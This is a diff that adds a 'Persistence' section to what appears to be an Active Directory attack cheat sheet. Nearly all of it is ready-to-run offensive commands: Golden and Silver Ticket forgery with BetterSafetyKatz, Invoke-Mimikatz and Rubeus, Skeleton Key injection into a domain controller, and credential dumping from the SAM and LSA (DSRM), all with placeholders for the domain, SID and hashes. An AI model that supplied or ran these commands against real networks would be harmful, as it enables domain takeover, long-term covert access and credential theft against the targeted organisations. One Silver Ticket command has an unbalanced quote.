@@ -344,8 +344,41 @@ SafetyKatz.exe "lsadump::dcsync /user:domain\krbtgt"
 ```
 
 # Persistence
-
-
-
-
-
+### Golden Ticket
+#### BetterSafetyKatz.exe 
+```
+BetterSafetyKatz.exe "kerberos::golden /User:Administrator /domain: /sid: /aes256: /startoffset:0 /endin:600 /renewmax:10080 /ptt" "exit"
+```
+#### Invoke-Mimikatz
+```
+Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain: /sid: /aes256: /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'
+```
+#### Rubeus 
+```
+Rubeus.exe -args %Pwn% /aes256: /sid: /ldap /user:Administrator /printcmd
+```
+### Silver Ticket
+#### Rubeus
+```
+Rubeus.exe -args %Pwn% /service:http/domain /rc4:dc$hash /sid: /ldap /user:Administrator /domain: /ptt
+```
+#### Invoke-Mimikatz
+```
+Invoke-Mimikatz -Command '"kerberos::golden /domain: /sid: /target:dcfqdn /service:servicename /rc4: /user:Administrator /ptt
+```
+#### BetterSafetyKatz.exe
+```
+BetterSafetyKatz.exe "kerberos::golden /User: /domain: /sid: /target:dcfqdn /service:servicename /rc4: /startoffset:0 /endin:600 /renewmax:10080 /ptt" "exit"
+```
+### Skeleton Key
+```
+Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"' -ComputerName name
+```
+### DSRM
+```
+Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"' -Computername name
+```
+#### Comparing Hashes
+```
+Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -Computername
+```
